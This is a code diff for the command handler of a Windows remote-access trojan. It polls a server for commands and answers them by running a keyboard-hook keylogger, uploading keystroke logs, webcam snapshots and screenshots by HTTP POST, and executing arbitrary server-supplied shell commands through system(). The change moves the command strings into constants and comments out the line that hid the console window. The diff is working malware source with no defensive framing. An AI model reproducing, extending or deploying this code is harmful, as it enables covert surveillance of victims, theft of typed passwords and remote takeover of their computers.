@@ -2,16 +2,14 @@
 #include "Capture/screenshot.h"
 #include "KeyLogger/logger.h"
 #include "HTTP/http.h"
+#include "constants.h"
 #include <stdio.h>
 #include <process.h>
 #include <string.h>
 #pragma warning(disable:4996)
 #pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "msvcrt.lib")
-#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // Hide console
-#define STACK_SIZE 16384
-#define ONE_MIN 60000 // miliseconds
-#define MAX_FILE_READ 262144 // 256 KB
+//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // Hide console
 
 HANDLE key_log_thread = { 0 };
 BOOL key_log_running = FALSE;
@@ -29,20 +27,22 @@ int execute_commands(char commands[MAX_COMMANDS][MAX_COMMAND_LEN]) {
 	DWORD bytes_read = 0;
 
 	while (strnlen(commands[i], MAX_COMMAND_LEN) && i < MAX_COMMANDS) {
-		if (strncmp(commands[i], "start_keylogging", strlen("start_keylogging")) == 0 && !key_log_running) {
+		if (strncmp(commands[i], START_KEYLOGGING, sizeof(START_KEYLOGGING) - 1) == 0
+			&& !key_log_running) {
 			key_log_thread = (HANDLE)_beginthreadex(NULL, STACK_SIZE,
 				&start_logging, NULL, 0, &thread_id);
 			key_log_running = TRUE;
 		}
-		else if (strncmp(commands[i], "send_keylogging", strlen("send_keylogging")) == 0) {
+		else if (strncmp(commands[i], SEND_KEYLOGGING, sizeof(SEND_KEYLOGGING) - 1) == 0) {
 			file_data = (char*)malloc(MAX_FILE_READ);
 			read_file(file_data, &bytes_read, MAX_FILE_READ);
-			send_post_request_without_listening(file_data, bytes_read, "keylog_data",
-				"text/plain");
+			send_post_request_without_listening(file_data, bytes_read, KEYLOG_URI,
+				TEXT_MIME);
 			free(file_data);
 
 		}
-		else if (strncmp(commands[i], "stop_keylogging", strlen("stop_keylogging")) == 0 && key_log_running) {
+		else if (strncmp(commands[i], STOP_KEYLOGGING, sizeof(STOP_KEYLOGGING) - 1) == 0
+			&& key_log_running) {
 			UnhookWindowsHookEx(hhk_low_level_hook);
 			CloseHandle(logger_file_handle);
 			GetExitCodeThread(key_log_thread, &exit_code);
@@ -55,27 +55,27 @@ int execute_commands(char commands[MAX_COMMANDS][MAX_COMMAND_LEN]) {
 			key_log_running = FALSE;
 			printf("stopped keylogging\n");
 		}
-		else if (strncmp(commands[i], "take_webcam_capture", strlen("take_webcam_capture")) == 0) {
+		else if (strncmp(commands[i], WEBCAM_CAPTURE, sizeof(WEBCAM_CAPTURE) - 1) == 0) {
 			bmp_capture = (char*)malloc(get_webcam_capture_size() * sizeof(char));
 			result = take_web_capture(&bmp_capture);
 			if (result == 0)
 				printf("Webcam is either not present or in use\n");
 			else
 				send_post_request_without_listening(bmp_capture, get_webcam_capture_size(),
-					"webcam_capture", "image/bmp");
+					WEBCAM_URI, BMP_MIME);
 			free(bmp_capture);
 		}
-		else if (strncmp(commands[i], "take_screenshot", strlen("take_screenshot")) == 0) {
+		else if (strncmp(commands[i], SCREENSHOT, sizeof(SCREENSHOT) - 1) == 0) {
 			bmp_capture = take_screen_capture();
 			send_post_request_without_listening(bmp_capture, get_screen_capture_size(),
-				"screenshot", "image/bmp");
+				SCREENSHOT_URI, BMP_MIME);
 			free(bmp_capture);
 		}
-		else if (strncmp(commands[i], "execute", strlen("execute")) == 0)
-			system(commands[i] + strlen("execute"));
-		else if (strncmp(commands[i], "stop_execution", strlen("stop_execution")) == 0)
+		else if (strncmp(commands[i], EXECUTE, sizeof(EXECUTE) - 1) == 0)
+			system(commands[i] + sizeof(EXECUTE));
+		else if (strncmp(commands[i], STOP_EXECUTION, sizeof(STOP_EXECUTION) - 1) == 0)
 			return 0;
-		else if (strncmp(commands[i], "no_commands", strlen("no_commands")) == 0)
+		else if (strncmp(commands[i], NO_COMMANDS, sizeof(NO_COMMANDS) - 1) == 0)
 			return 1;
 		else
 			printf("Invalid command: %s\n", commands[i]);
@@ -85,7 +85,7 @@ int execute_commands(char commands[MAX_COMMANDS][MAX_COMMAND_LEN]) {
 }
 
 int main() {
-	HTTP_RESPONSE http_response = send_get_command("first_command");
+	COMMANDS_HTTP_RESPONSE http_response = send_get_command("first_command");
 	while (1) {
 		if (!execute_commands(http_response.commands))
 			break;
